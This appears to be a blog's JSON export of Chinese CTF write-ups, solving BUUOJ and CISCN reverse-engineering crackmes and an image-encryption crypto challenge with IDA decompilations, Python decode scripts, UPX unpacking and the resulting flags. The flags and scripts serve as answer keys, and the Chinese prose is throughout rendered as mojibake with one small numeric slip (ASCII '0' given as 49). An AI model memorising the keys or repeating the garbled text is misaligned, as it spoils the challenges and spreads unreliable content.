flag{bAse64_h2s_a_Surprise} [MRCTF2020]Transform é“¾æ¥: https://buuoj.cn/challenges#[MRCTF2020]Transform EXE 64 IDAä¸­ main å‡½æ•°åç¼–è¯‘ç»“æœå¦‚ä¸‹ 1234567891011121314151617181920212223242526272829303132333435363738int __cdecl main(int argc, const char **argv, const char **envp)&#123; __int64 v3; // rdx __int64 v4; // rdx char v6[104]; // [rsp+20h] [rbp-70h] int j; // [rsp+88h] [rbp-8h] int i; // [rsp+8Ch] [rbp-4h] sub_402230(argc, argv, envp); sub_40E640(argc, (__int64)argv, v3, (__int64)&quot;Give me your code:\\n&quot;); sub_40E5F0(argc, (__int64)argv, (__int64)v6, (unsigned __int64)&quot;%s&quot;); if ( strlen(*(const char **)&amp;argc) != 33 ) &#123; sub_40E640(argc, (__int64)argv, v4, (__int64)&quot;Wrong!\\n&quot;); system(*(const char **)&amp;argc); exit(argc); &#125; for ( i = 0; i &lt;= 32; ++i ) &#123; byte_414040[i] = v6[dword_40F040[i]]; v4 = i; byte_414040[i] ^= LOBYTE(dword_40F040[i]); &#125; for ( j = 0; j &lt;= 32; ++j ) &#123; v4 = j; if ( byte_40F0E0[j] != byte_414040[j] ) &#123; sub_40E640(argc, (__int64)argv, j, (__int64)&quot;Wrong!\\n&quot;); system(*(const char **)&amp;argc); exit(argc); &#125; &#125; sub_40E640(argc, (__int64)argv, v4, (__int64)&quot;Right!Good Job!\\n&quot;); sub_40E640(argc, (__int64)argv, (__int64)v6, (__int64)&quot;Here is your flag: %s\\n&quot;); system(*(const char **)&amp;argc); return 0;&#125; v6ä¸ºè¾“å…¥çš„å€¼, å³flag å…ˆå°†flagå­—ç¬¦ä¸²æ‰“ä¹±é¡ºåº, å†è¿›è¡Œå¼‚æˆ–å¤„ç† è¿™é‡Œå€¼å¾—æ³¨æ„çš„ä¸€ç‚¹ä¸º dword_40F040[32] = 0x00000000 ç”±äºåç»­è¿˜æœ‰ä¸‰ä¸ªè¿ç»­çš„0x00000000, å¯èƒ½ä¼šè¯¯ä»¥ä¸ºdword_40F040çš„é•¿åº¦åªæœ‰31 1234567891011121314151617181920#!/usr/bin/env python3_40F040 = [0x09, 0x0A, 0x0F, 0x17, 0x07, 0x18, 0x0C, 0x06, 0x01, 0x10, 0x03, 0x11, 0x20, 0x1D, 0x0B, 0x1E, 0x1B, 0x16, 0x04, 0x0D, 0x13, 0x14, 0x15, 0x02, 0x19, 0x05, 0x1F, 0x08, 0x12, 0x1A, 0x1C, 0x0E,0x00]cipher = [0x67, 0x79, 0x7B, 0x7F, 0x75, 0x2B, 0x3C, 0x52, 0x53, 0x79, 0x57, 0x5E, 0x5D, 0x42, 0x7B, 0x2D, 0x2A, 0x66, 0x42, 0x7E, 0x4C, 0x57, 0x79, 0x41, 0x6B, 0x7E, 0x65, 0x3C, 0x5C, 0x45, 0x6F, 0x62, 0x4D]for _ in range(len(cipher)): cipher[_] = cipher[_]^_40F040[_]plain = [0 for _ in range(33)]for _ in range(len(plain)): plain[_40F040[_]] = chr(cipher[_])flag = &#x27;&#x27;.join(plain)print(flag) flag{Tr4nsp0sltiON_Clph3r_1s_3z} [WUSTCTF2020]level1 é“¾æ¥: https://buuoj.cn/challenges#[WUSTCTF2020]level1 ELF 64 IDAä¸­ main å‡½æ•°åç¼–è¯‘ç»“æœå¦‚ä¸‹ 1234567891011121314151617181920int __cdecl main(int argc, const char **argv, const char **envp)&#123; FILE *stream; // ST08_8 signed int i; // [rsp+4h] [rbp-2Ch] char ptr[24]; // [rsp+10h] [rbp-20h] unsigned __int64 v7; // [rsp+28h] [rbp-8h] v7 = __readfsqword(0x28u); stream = fopen(&quot;flag&quot;, &quot;r&quot;); fread(ptr, 1uLL, 20uLL, stream); fclose(stream); for ( i = 1; i &lt;= 19; ++i ) &#123; if ( i &amp; 1 ) printf(&quot;%ld\\n&quot;, (unsigned int)(ptr[i] &lt;&lt; i)); else printf(&quot;%ld\\n&quot;, (unsigned int)(i * ptr[i])); &#125; return 0;&#125; æ²¡æœ‰ç»™å‡ºflag[0] æ‰€ä»¥è§£å¯†æ—¶ä¹Ÿéœ€è¦å¡«å……ä¸€ä¸ªflag[0], ä»¥ä¿è¯ä¸‹æ ‡å¯¹é½ 123456789#!/usr/bin/env python3cipher = [&quot; &quot;, 198, 232, 816, 200, 1536, 300, 6144, 984, 51200, 570, 92160, 1200, 565248, 756, 1474560, 800, 6291456, 1782, 65536000]for _ in range(1, 20): if _ &amp; 1: cipher[_] = chr(cipher[_]&gt;&gt;_) else: cipher[_] = chr(cipher[_]//_)flag = &quot;&quot;.join(cipher)print(flag) flag{d9-dE6-20c} [WUSTCTF2020]level2 é“¾æ¥: https://buuoj.cn/challenges#[WUSTCTF2020]level2 ELF 32 UPXè„±å£³å³å¯ç”¨IDAåœ¨mainå‡½æ•°ä¸­çœ‹åˆ°flag flag{Just_upx_-d} EOF","categories":[{"name":"Study","slug":"Study","permalink":"https://yoloyolo.top/categories/Study/"}],"tags":[{"name":"Reverse","slug":"Reverse","permalink":"https://yoloyolo.top/tags/Reverse/"}]},{"title":"CISCN-imageencrypt","slug":"CISCN-imageencrypt","date":"2021-05-17T02:42:13.000Z","updated":"2021-07-04T08:22:47.000Z","comments":true,"path":"2021/05/16/CISCN-imageencrypt/","link":"","permalink":"https://yoloyolo.top/2021/05/16/CISCN-imageencrypt/","excerpt":"æœ‰æ„æ€çš„ä¸€é¢˜","text":"æœ‰æ„æ€çš„ä¸€é¢˜ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162import randomfrom flag import flag,image,r,key1,key2import md5assert(flag[:5]==&#x27;CISCN&#x27;)assert(len(str(r))==3) # 1.2 data = &#x27;&#x27;.join(map(chr,image))assert(flag[6:-1] == md5.new(data).hexdigest())assert(key1&lt;256)assert(key2&lt;256)x0 = round(random.random(),6)def generate(x): return round(r*x*(3-x),6) # r &lt; 1def encrypt(pixel,key1,key2,x0,m,n): num = m*n/8 seqs = [] x = x0 bins = &#x27;&#x27; tmp = [] for i in range(num): x = generate(x) tmp.append(x) seqs.append(int(x*22000)) for x in seqs: bin_x = bin(x)[2:] if len(bin_x) &lt; 16: bin_x = &#x27;0&#x27;*(16-len(bin_x))+bin_x bins += bin_x assert(len(pixel) == m*n) cipher = [ 0 for i in range(m) for j in range(n)] for i in range(m): for j in range(n): index = n*i+j ch = int(bins[2*index:2*index+2],2) pix = pixel[index] if ch == 0: pix = (pix^key1)&amp;0xff if ch == 1: pix = (~pix^key1)&amp;0xff if ch == 2: pix = (pix^key2)&amp;0xff if ch == 3: pix = (~pix^key2)&amp;0xff cipher[index] = pix return cipherflagimage = imagetestimage = []for i in range(16*16): testimage.append(random.randint(0,255))print testimageprint encrypt(testimage,key1,key2,x0,16,16)print encrypt(flagimage,key1,key2,x0,24,16)&quot;&quot;&quot;[205, 237, 6, 158, 24, 119, 213, 32, 74, 151, 142, 186, 57, 28, 113, 62, 165, 20, 190, 37, 159, 137, 196, 44, 97, 37, 7, 222, 220, 95, 4, 66, 0, 28, 199, 142, 95, 105, 119, 232, 250, 215, 60, 162, 91, 211, 63, 30, 91, 108, 217, 206, 80, 193, 230, 42, 221, 71, 136, 115, 22, 176, 91, 57, 61, 3, 87, 73, 250, 121, 51, 72, 83, 120, 77, 199, 236, 190, 249, 116, 45, 6, 134, 110, 149, 94, 214, 232, 153, 213, 119, 98, 81, 203, 240, 114, 240, 29, 122, 188, 156, 53, 128, 185, 40, 147, 245, 204, 47, 101, 80, 229, 41, 150, 28, 195, 25, 235, 119, 6, 192, 8, 73, 255, 159, 172, 77, 94, 254, 104, 236, 219, 141, 91, 195, 162, 97, 56, 252, 173, 163, 43, 167, 214, 50, 73, 115, 190, 254, 53, 61, 77, 138, 192, 15, 4, 190, 27, 37, 108, 101, 135, 90, 215, 106, 243, 112, 111, 106, 89, 143, 150, 185, 142, 192, 176, 48, 138, 164, 185, 61, 77, 72, 0, 17, 203, 210, 71, 186, 49, 162, 250, 218, 219, 195, 63, 248, 220, 155, 180, 219, 132, 219, 94, 144, 247, 211, 95, 70, 227, 222, 31, 69, 24, 13, 216, 185, 108, 137, 57, 186, 211, 55, 27, 158, 241, 223, 21, 134, 106, 152, 127, 187, 245, 246, 131, 176, 177, 228, 100, 112, 11, 84, 61, 193, 42, 41, 69, 229, 145, 254, 138, 3, 153, 123, 31][131, 92, 72, 47, 177, 57, 131, 118, 4, 38, 192, 19, 119, 82, 63, 143, 235, 165, 15, 140, 209, 223, 117, 133, 47, 148, 81, 144, 138, 246, 173, 235, 177, 181, 110, 39, 9, 192, 57, 166, 180, 153, 141, 19, 234, 157, 142, 80, 234, 197, 151, 152, 249, 143, 176, 155, 147, 17, 57, 194, 191, 254, 13, 144, 140, 85, 25, 248, 172, 208, 154, 249, 5, 201, 27, 137, 69, 23, 175, 34, 156, 72, 208, 32, 195, 16, 127, 65, 207, 131, 57, 203, 7, 98, 89, 36, 65, 75, 211, 21, 45, 132, 214, 239, 102, 58, 68, 130, 97, 204, 225, 76, 152, 216, 74, 149, 79, 165, 198, 72, 150, 94, 7, 177, 46, 226, 252, 247, 79, 62, 69, 106, 60, 21, 106, 236, 47, 145, 170, 28, 18, 101, 14, 152, 131, 7, 37, 15, 168, 99, 115, 27, 220, 150, 89, 82, 232, 170, 107, 221, 212, 46, 235, 129, 36, 66, 217, 222, 36, 15, 217, 192, 247, 192, 113, 230, 129, 196, 13, 247, 148, 228, 225, 86, 71, 133, 132, 238, 236, 127, 11, 83, 107, 141, 114, 150, 182, 146, 213, 250, 141, 53, 114, 16, 198, 70, 133, 17, 247, 173, 136, 73, 236, 78, 188, 150, 239, 58, 199, 136, 11, 122, 134, 77, 47, 167, 137, 188, 55, 195, 41, 49, 245, 92, 160, 213, 254, 0, 85, 205, 193, 69, 2, 140, 143, 155, 127, 236, 179, 199, 168, 35, 85, 40, 45, 174][198, 143, 247, 3, 152, 139, 131, 84, 181, 180, 252, 177, 192, 25, 217, 179, 136, 107, 190, 62, 4, 6, 90, 53, 105, 238, 117, 44, 5, 116, 132, 195, 214, 171, 113, 209, 18, 31, 194, 174, 228, 212, 196, 14, 27, 41, 211, 56, 139, 135, 225, 214, 89, 122, 178, 212, 185, 231, 204, 150, 204, 212, 160, 142, 213, 173, 186, 166, 65, 238, 5, 32, 45, 31, 25, 189, 148, 38, 78, 79, 33, 56, 227, 48, 103, 163, 31, 189, 37, 124, 106, 249, 86, 188, 86, 233, 41, 250, 89, 7, 212, 234, 111, 104, 245, 102, 227, 96, 160, 67, 181, 13, 26, 192, 214, 210, 188, 84, 216, 215, 243, 72, 233, 2, 122, 166, 107, 251, 70, 128, 94, 190, 185, 210, 34, 85, 77, 29, 182, 77, 115, 208, 228, 252, 73, 198, 151, 70, 10, 97, 138, 235, 21, 117, 239, 102, 129, 2, 253, 80, 53, 61, 184, 220, 41, 82, 37, 140, 23, 143, 179, 53, 153, 113, 213, 211, 111, 197, 248, 65, 60, 69, 1, 81, 48, 254, 251, 89, 195, 8, 93, 190, 66, 174, 97, 175, 210, 191, 66, 112, 123, 128, 33, 230, 237, 104, 16, 192, 239, 173, 44, 10, 120, 231, 114, 151, 140, 63, 103, 44, 243, 222, 242, 73, 51, 46, 98, 137, 163, 152, 147, 95, 223, 3, 15, 112, 85, 215, 133, 131, 240, 239, 224, 195, 140, 124, 70, 156, 221, 241, 37, 245, 1, 99, 9, 157, 99, 150, 47, 118, 225, 16, 13, 141, 135, 99, 18, 119, 63, 160, 6, 247, 27, 68, 45, 199, 86, 193, 252, 21, 135, 32, 42, 103, 114, 241, 49, 249, 182, 52, 18, 155, 157, 61, 4, 246, 158, 52, 118, 242, 195, 54, 139, 232, 100, 31, 11, 233, 58, 100, 101, 137, 83, 145, 209, 7, 241, 96, 57, 148, 207, 29, 237, 124, 177, 166, 161, 20, 116, 122, 61, 71, 46, 82, 18, 157, 253, 130, 112, 66, 94, 57, 221, 243, 222, 192, 147, 5, 130, 201, 174, 26, 160, 16, 188, 103, 187, 11, 238, 182, 144, 4, 137, 33, 84, 100, 7, 239, 219, 83, 112, 189, 166, 58, 93, 141, 30, 198, 220, 196, 118, 172, 5, 45]&quot;&quot;&quot; å¤§æ¦‚æµç¨‹å¦‚ä¸‹ x0ä½œä¸ºåˆå§‹å€¼, é€šè¿‡xi+1=tâˆ—xiâˆ—(3âˆ’xi)x_{i+1} = t*x_{i}*(3-x_{i})xi+1â€‹=tâˆ—xiâ€‹âˆ—(3âˆ’xiâ€‹)æ¥äº§ç”Ÿåºåˆ—, å…¶ä¸­tä¸ºç³»æ•° äº§ç”Ÿçš„åºåˆ—ä½œä¸ºå¯†é’¥, å¯†é’¥ç”¨äºåŠ å¯†åˆ—è¡¨, ä½†æ˜¯å¯†é’¥çš„æ¯2bitç»„åˆå†³å®šä½¿ç”¨å“ªä¸ªkeyè¿›è¡ŒåŠ å¯† è™½ç„¶ä»£ç ä¸­å†™çš„æ˜¯pix = (~pix^key1)&amp;0xff ä½†æ˜¯(~pix^key1) == (pix^~key1), é‚£ä¹ˆå¯ä»¥ç†è§£ä¸ºæœ‰ä¸¤ç»„key key1 &amp; ~key1 key2 &amp; ~key2 ç”¨äºæµ‹è¯•çš„åˆ—è¡¨ç›¸å¼‚æˆ–å³å¯å¾—åˆ°ä¸¤ç»„key 78 &amp; 177 86 &amp; 169 ç°åœ¨æˆ‘ä»¬éœ€è¦çŸ¥é“è¿™ä¸¤ç»„keyå¦‚ä½•å¯¹åº”key1, key2, ~key1, ~key2 ä¸€å…±å­˜åœ¨8ç§æƒ…å†µ å¯¹äºæ¯ç§æƒ…å†µéƒ½è¿›è¡Œæµ‹è¯•, è¿˜åŸå‡º8ç§å¯†é’¥, å†é€šè¿‡è¿™8ç§å¯†é’¥è¿˜åŸå‡º8ç§åºåˆ— ç”±äºåºåˆ—çš„äº§ç”Ÿæ»¡è¶³xi+1=tâˆ—xiâˆ—(3âˆ’xi)x_{i+1} = t*x_{i}*(3-x_{i})xi+1â€‹=tâˆ—xiâ€‹âˆ—(3âˆ’xiâ€‹)çš„è§„å¾‹ é‚£ä¹ˆxi+1xiâˆ—(3âˆ’xi)=t\\frac{x_{i+1}}{x_{i}*(3-x_{i})} = txiâ€‹âˆ—(3âˆ’xiâ€‹)xi+1â€‹â€‹=tæ˜¯æˆç«‹çš„ é‚£ä¹ˆå¯ä»¥é€šè¿‡ä½¿ç”¨æ¯ä¸ªåºåˆ—æ¥è®¡ç®—æ¯æ¬¡è®¡ç®—è¿‡ç¨‹çš„ç³»æ•°t, å½“tçš„å€¼ç¨³å®šåœ¨æŸä¸€å€¼é™„è¿‘æ—¶, åˆ™å¯ä»¥ç¡®å®štçš„å€¼, åŒæ—¶å¯ä»¥ç¡®å®škey1&amp;key2ä»¥åŠæ­£ç¡®çš„åºåˆ— ç»è¿‡è®¡ç®—å¾—åˆ° key1 = 169 key2 = 78 t = 1.2 é‚£ä¹ˆè¿˜å‰©ä¸‹ä¸€ä¸ªx0 å¯¹äºx0çš„è®¡ç®—, æˆ‘ä»¬å®Œå…¨å¯ä»¥çˆ†ç ´ä¸€ä¸ªå…­ä½çš„å°æ•°, ä½¿å…¶è¿­ä»£ç»“æœä¸æ­£ç¡®çš„åºåˆ—ç›¸åŒ¹é… (è¿™é‡Œæœ‰ä¸€ä¸ªå°å‘: æ­£ç¡®çš„åºåˆ—ä½¿ç”¨ä¹˜ä»¥22000ä¹‹åçš„å€¼) çˆ†ç ´ç»“æœä¸º0.840264 é‚£ä¹ˆé€šè¿‡è¿™äº›æ¡ä»¶, å†è°ƒç”¨ä¸€æ¬¡encryptå‡½æ•°å°±å¯ä»¥è·å¾—flag EOF","categories":[{"name":"WriteUp","slug":"WriteUp","permalink":"https://yoloyolo.top/categories/WriteUp/"}],"tags":[{"name":"Crypto","slug":"Crypto","permalink":"https://yoloyolo.top/tags/Crypto/"},{"name":"CISCN","slug":"CISCN","permalink":"https://yoloyolo.top/tags/CISCN/"}]},{"title":"Reverse_0","slug":"Reverse-0","date":"2021-05-09T05:34:11.000Z","updated":"2021-05-22T11:18:02.000Z","comments":true,"path":"2021/05/09/Reverse-0/","link":"","permalink":"https://yoloyolo.top/2021/05/09/Reverse-0/","excerpt":"æƒ³å†™ç‚¹ä»€ä¹ˆå´åˆä¸çŸ¥è¯¥å†™ä»€ä¹ˆ, å°±å†™å†™BUUOJçš„é€†å‘é¢˜è§£è®°å½•å§","text":"æƒ³å†™ç‚¹ä»€ä¹ˆå´åˆä¸çŸ¥è¯¥å†™ä»€ä¹ˆ, å°±å†™å†™BUUOJçš„é€†å‘é¢˜è§£è®°å½•å§ easyre é“¾æ¥: https://buuoj.cn/challenges#easyre EXE 64 IDAä¸­ main å‡½æ•°åç¼–è¯‘ç»“æœå¦‚ä¸‹ 12345678910111213int __cdecl main(int argc, const char **argv, const char **envp)&#123; int b; // [rsp+28h] [rbp-8h] int a; // [rsp+2Ch] [rbp-4h] _main(); scanf(&quot;%d%d&quot;, &amp;a, &amp;b); if ( a == b ) printf(&quot;flag&#123;this_Is_a_EaSyRe&#125;&quot;); else printf(&quot;sorry,you can&#x27;t get flag&quot;); return 0;&#125; è¾“å…¥ä¸¤ä¸ªä¸€æ ·çš„æ•°å­—å³è¾“å‡ºflag flag{this_Is_a_EaSyRe} reverse1 é“¾æ¥: https://buuoj.cn/challenges#reverse1 EXE 64 IDAä¸­ sub_1400118C0 å‡½æ•°åç¼–è¯‘ç»“æœå¦‚ä¸‹ 123456789101112131415161718192021222324252627282930313233343536__int64 sub_1400118C0()&#123; char *v0; // rdi signed __int64 i; // rcx size_t v2; // rax size_t v3; // rax char v5; // [rsp+0h] [rbp-20h] int j; // [rsp+24h] [rbp+4h] char Str1; // [rsp+48h] [rbp+28h] unsigned __int64 v8; // [rsp+128h] [rbp+108h] v0 = &amp;v5; for ( i = 82i64; i; --i ) &#123; *(_DWORD *)v0 = 0xCCCCCCCC; v0 += 4; &#125; for ( j = 0; ; ++j ) &#123; v8 = j; v2 = j_strlen(Str2); if ( v8 &gt; v2 ) break; if ( Str2[j] == 111 ) Str2[j] = 48; &#125; sub_1400111D1((__int64)&quot;input the flag:&quot;); sub_14001128F(&quot;%20s&quot;, &amp;Str1); v3 = j_strlen(Str2); if ( !strncmp(&amp;Str1, Str2, v3) ) sub_1400111D1((__int64)&quot;this is the right flag!\\n&quot;); else sub_1400111D1((__int64)&quot;wrong flag\\n&quot;); sub_14001113B(&amp;v5, &amp;unk_140019D00); return 0i64;&#125; å…¶ä¸­Str2=&quot;&#123;hello_world&#125;&quot;, è€Œå‡½æ•°åœ¨éå†Str2æ—¶, ä¼šæŠŠ'o'(111)æ›¿æ¢ä¸º'0'(49), æœ€åå°†ç”¨æˆ·çš„è¾“å…¥(Str1)ä¸Str2è¿›è¡Œæ¯”è¾ƒ flag{hell0_w0rld} reverse2 é“¾æ¥: https://buuoj.cn/challenges#reverse2 ELF 64 IDAä¸­ main å‡½æ•°åç¼–è¯‘ç»“æœå¦‚ä¸‹ 1234567891011121314151617181920212223242526272829303132int __cdecl main(int argc, const char **argv, const char **envp)&#123; int result; // eax int stat_loc; // [rsp+4h] [rbp-3Ch] int i; // [rsp+8h] [rbp-38h] __pid_t pid; // [rsp+Ch] [rbp-34h] char s2; // [rsp+10h] [rbp-30h] unsigned __int64 v8; // [rsp+28h] [rbp-18h] v8 = __readfsqword(0x28u); pid = fork(); if ( pid ) &#123; argv = (const char **)&amp;stat_loc; waitpid(pid, &amp;stat_loc, 0); &#125; else &#123; for ( i = 0; i &lt;= strlen(&amp;flag); ++i ) &#123; if ( *(&amp;flag + i) == 105 || *(&amp;flag + i) == 114 ) *(&amp;flag + i) = 49; &#125; &#125; printf(&quot;input the flag:&quot;, argv); __isoc99_scanf(&quot;%20s&quot;, &amp;s2); if ( !strcmp(&amp;flag, &amp;s2) ) result = puts(&quot;this is the right flag!&quot;); else result = puts(&quot;wrong flag!&quot;); return result;&#125; å…¶ä¸­flag=&quot;&#123;hacking_for_fun&#125;&quot;, å‡½æ•°åœ¨éå†flagæ—¶ä¼šå°†'i'(105)å’Œ'r'(114)æ›¿æ¢ä¸º'1'(49) flag{hack1ng_fo1_fun} å†…æ¶µçš„è½¯ä»¶ é“¾æ¥: https://buuoj.cn/challenges#å†…æ¶µçš„è½¯ä»¶ EXE 32 IDAä¸­ main_0 å‡½æ•°åç¼–è¯‘ç»“æœå¦‚ä¸‹ 12345678910111213141516171819202122232425262728293031323334353637int main_0()&#123; int result; // eax char v1; // [esp+4Ch] [ebp-Ch] const char *v2; // [esp+50h] [ebp-8h] int v3; // [esp+54h] [ebp-4h] v3 = 5; v2 = &quot;DBAPP&#123;49d3c93df25caad81232130f3d2ebfad&#125;&quot;; while ( v3 &gt;= 0 ) &#123; printf(aD, v3); sub_40100A(); --v3; &#125; printf( &quot;\\n&quot; &quot;\\n&quot; &quot;\\n&quot; &quot;è¿™é‡Œæœ¬æ¥åº”è¯¥æ˜¯ç­”æ¡ˆçš„,ä½†æ˜¯ç²—å¿ƒçš„ç¨‹åºå‘˜å¿˜è®°æŠŠå˜é‡å†™è¿›æ¥äº†,ä½ è¦ä¸é€†å‘è¯•è¯•çœ‹:(Y/N)\\n&quot;); v1 = 1; scanf(&quot;%c&quot;, &amp;v1); if ( v1 == 89 ) &#123; printf(aOdIda); result = sub_40100A(); &#125; else &#123; if ( v1 == 78 ) printf(asc_425034); else printf(&quot;è¾“å…¥é”™è¯¯,æ²¡æœ‰æç¤º.&quot;); result = sub_40100A(); &#125; return result;&#125; flag{49d3c93df25caad81232130f3d2ebfad} æ–°å¹´å¿«ä¹ é“¾æ¥: https://buuoj.cn/challenges#æ–°å¹´å¿«ä¹ EXE 32 12file æ–°å¹´å¿«ä¹.exeæ–°å¹´å¿«ä¹.exe: PE32 executable (console) Intel 80386, for MS Windows, UPX compressed å­˜åœ¨UPXå£³ è„±å£³ 12345678910upx -d æ–°å¹´å¿«ä¹.exe Ultimate Packer for eXecutables Copyright (C) 1996 - 2020UPX 3.96 Markus Oberhumer, Laszlo Molnar &amp; John Reiser Jan 23rd 2020 File size Ratio Format Name -------------------- ------ ----------- ----------- 27807 &lt;- 21151 76.06% win32/pe æ–°å¹´å¿«ä¹.exeUnpacked 1 file. IDAä¸­ _main å‡½æ•°åç¼–è¯‘ç»“æœå¦‚ä¸‹ 12345678910111213141516171819int __cdecl main(int argc, const char **argv, const char **envp)&#123; int result; // eax char v4; // [esp+12h] [ebp-3Ah] __int16 v5; // [esp+20h] [ebp-2Ch] __int16 v6; // [esp+22h] [ebp-2Ah] __main(); strcpy(&amp;v4, &quot;HappyNewYear!&quot;); v5 = 0; memset(&amp;v6, 0, 0x1Eu); printf(&quot;please input the true flag:&quot;); scanf(&quot;%s&quot;, &amp;v5); if ( !strncmp((const char *)&amp;v5, &amp;v4, strlen(&amp;v4)) ) result = puts(&quot;this is true flag!&quot;); else result = puts(&quot;wrong!&quot;); return result;&#125; flag{HappyNewYear!} helloword é“¾æ¥: https://buuoj.cn/challenges#helloword Android ä½¿ç”¨Android Studioæ‰“å¼€ åœ¨java-&gt;com.example-&gt;helloworld-&gt;MainActivityä¸­å¾—åˆ°flag flag{7631a988259a00816deda84afb29430a} xor é“¾æ¥: https://buuoj.cn/challenges#xor EXE 64 IDAä¸­ _main å‡½æ•°åç¼–è¯‘ç»“æœå¦‚ä¸‹ 123456789101112131415161718192021222324252627int __cdecl main(int argc, const char **argv, const char **envp)&#123; char *v3; // rsi int result; // eax signed int i; // [rsp+2Ch] [rbp-124h] char v6[264]; // [rsp+40h] [rbp-110h] __int64 v7; // [rsp+148h] [rbp-8h] memset(v6, 0, 0x100uLL); v3 = (char *)256; printf(&quot;Input your flag:\\n&quot;, 0LL); get_line(v6, 256LL); if ( strlen(v6) != 33 ) goto LABEL_12; for ( i = 1; i &lt; 33; ++i ) v6[i] ^= v6[i - 1]; v3 = global; if ( !strncmp(v6, global, 0x21uLL) ) printf(&quot;Success&quot;, v3); elseLABEL_12: printf(&quot;Failed&quot;, v3); result = __stack_chk_guard; if ( __stack_chk_guard == v7 ) result = 0; return result;&#125; 123456_global = [0x66, 0x0A, 0x6B, 0x0C, 0x77, 0x26, 0x4F, 0x2E, 0x40, 0x11, 0x78, 0x0D, 0x5A, 0x3B, 0x55, 0x11, 0x70, 0x19, 0x46, 0x1F, 0x76, 0x22, 0x4D, 0x23, 0x44, 0x0E, 0x67, 0x06, 0x68, 0x0F, 0x47, 0x32, 0x4F] ç”¨æˆ·è¾“å…¥ç»è¿‡å¼‚æˆ–æ“ä½œåä¸globalç›¸æ¯”è¾ƒ, åˆ™globalä¸ºåŠ å¯†åçš„flag è§£å¯†è„šæœ¬å¦‚ä¸‹ 12345678910#!/usr/bin/env python3cipher = [0x66, 0x0A, 0x6B, 0x0C, 0x77, 0x26, 0x4F, 0x2E, 0x40, 0x11, 0x78, 0x0D, 0x5A, 0x3B, 0x55, 0x11, 0x70, 0x19, 0x46, 0x1F, 0x76, 0x22, 0x4D, 0x23, 0x44, 0x0E, 0x67, 0x06, 0x68, 0x0F, 0x47, 0x32, 0x4F]flag = chr(cipher[0])for i in range(1, len(cipher)): flag += chr(cipher[i]^cipher[i-1])print(flag) flag{QianQiuWanDai_YiTongJiangHu} reverse3 é“¾æ¥: https://buuoj.cn/challenges#reverse3 EXE 32 IDAä¸­ _main_0 å‡½æ•°åç¼–è¯‘ç»“æœå¦‚ä¸‹ 12345678910111213141516171819202122232425262728293031323334353637__int64 main_0()&#123; size_t v0; // eax const char *v1; // eax size_t v2; // eax int v3; // edx __int64 v4; // ST08_8 signed int j; // [esp+DCh] [ebp-ACh] signed int i; // [esp+E8h] [ebp-A0h] signed int v8; // [esp+E8h] [ebp-A0h] char Dest[108]; // [esp+F4h] [ebp-94h] char Str; // [esp+160h] [ebp-28h] char v11; // [esp+17Ch] [ebp-Ch] for ( i = 0; i &lt; 100; ++i ) &#123; if ( (unsigned int)i &gt;= 0x64 ) j____report_rangecheckfailure(); Dest[i] = 0; &#125; sub_41132F(&quot;please enter the flag:&quot;); sub_411375(&quot;%20s&quot;, &amp;Str); v0 = j_strlen(&amp;Str); v1 = (const char *)sub_4110BE(&amp;Str, v0, &amp;v11); strncpy(Dest, v1, 0x28u); v8 = j_strlen(Dest); for ( j = 0; j &lt; v8; ++j ) Dest[j] += j; v2 = j_strlen(Dest); if ( !strncmp(Dest, Str2, v2) ) sub_41132F(&quot;rigth flag!\\n&quot;); else sub_41132F(&quot;wrong flag!\\n&quot;); HIDWORD(v4) = v3; LODWORD(v4) = 0; return v4;&#125; Str2 = &quot;e3nifIH9b_C@n@dH&quot; 123456#!/usr/bin/env python3cipher=&quot;e3nifIH9b_C@n@dH&quot;string = &quot;&quot;for i in range(len(cipher)): string += chr(ord(cipher[i])-i)print(string) è§£å¯†å¾—åˆ°å­—ç¬¦ä¸²e2lfbDB2ZV95b3V9 åœ¨è§‚å¯Ÿå‡½æ•°å¯ä»¥çœ‹åˆ°ç”¨æˆ·è¾“å…¥çš„å­—ç¬¦ä¸²ç»è¿‡äº†å‡½æ•°sub_4110BEçš„å¤„ç† è·Ÿè¿›å‡½æ•°å¯ä»¥çœ‹åˆ°ä¸€ä¸ªå­—ç¬¦ä¸² 1aAbcdefghijklmn=&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=&quot; å¯ä»¥åˆ¤æ–­å†…å®¹ä¸ºBase64å­—ç¬¦é›†, å³å‡½æ•°åŠŸèƒ½ä¸ºBase64ç¼–ç  12echo -n &quot;e2lfbDB2ZV95b3V9&quot; | base64 -d&#123;i_l0ve_you&#125; flag{i_l0ve_you} ä¸ä¸€æ ·çš„flag é“¾æ¥: https://buuoj.cn/challenges#ä¸ä¸€æ ·çš„flag EXE 32 IDAä¸­ _main å‡½æ•°åç¼–è¯‘ç»“æœå¦‚ä¸‹ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859int __cdecl main(int argc, const char **argv, const char **envp)&#123; char v3; // [esp+17h] [ebp-35h] int v4; // [esp+30h] [ebp-1Ch] int v5; // [esp+34h] [ebp-18h] signed int v6; // [esp+38h] [ebp-14h] int i; // [esp+3Ch] [ebp-10h] int v8; // [esp+40h] [ebp-Ch] __main(); v4 = 0; v5 = 0; qmemcpy(&amp;v3, _data_start__, 0x19u); while ( 1 ) &#123; puts(&quot;you can choose one action to execute&quot;); puts(&quot;1 up&quot;); puts(&quot;2 down&quot;); puts(&quot;3 left&quot;); printf(&quot;4 right\\n:&quot;); scanf(&quot;%d&quot;, &amp;v6); if ( v6 == 2 ) &#123; ++v4; &#125; else if ( v6 &gt; 2 ) &#123; if ( v6 == 3 ) &#123; --v5; &#125; else &#123; if ( v6 != 4 )LABEL_13: exit(1); ++v5; &#125; &#125; else &#123; if ( v6 != 1 ) goto LABEL_13; --v4; &#125; for ( i = 0; i &lt;= 1; ++i ) &#123; if ( *(&amp;v4 + i) &lt; 0 || *(&amp;v4 + i) &gt; 4 ) exit(1); &#125; if ( *((_BYTE *)&amp;v8 + 5 * v4 + v5 - 41) == 49 ) exit(1); if ( *((_BYTE *)&amp;v8 + 5 * v4 + v5 - 41) == 35 ) &#123; puts(&quot;\\nok, the order you enter is the flag!&quot;); exit(0); &#125; &#125;&#125; è¾“å…¥&quot;1234&quot;åˆ†åˆ«å¯¹åº”ä¸Šä¸‹å·¦å³, v4ä¸ºYè½´, v5ä¸ºXè½´ è¿™æ®µä»£ç ç”¨äºæ£€æµ‹Yè½´ä¸Xè½´çš„å€¼æ˜¯å¦åœ¨[0, 4]è¿™ä¸ªèŒƒå›´å†… (v4, 